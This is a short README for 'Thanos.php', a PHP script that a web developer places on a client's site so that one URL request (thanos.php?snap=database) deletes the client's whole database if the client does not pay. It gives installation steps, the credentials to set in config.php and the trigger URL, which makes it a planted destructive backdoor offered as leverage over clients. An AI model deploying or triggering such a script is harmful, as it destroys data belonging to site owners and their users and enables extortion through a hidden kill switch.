# Thanos.php
Thanos.php is a server-side script capable of removing the whole database of a website if client don't want to pay the bill.

**Just execute the server side script in the 
client's website**

Copy *thanos.php* and set *config.php* in you htdocs first

USAGE: thanos.php?snap=[param]<br>
EXAMPLE : www.client.com/thanos.php?snap=database

PARAM: 1. database

**Set the following conditions in your 
configuration file**

* set $server = [server name]
* set $user = [username]
* set $password = [password]
* set $database = [database name]
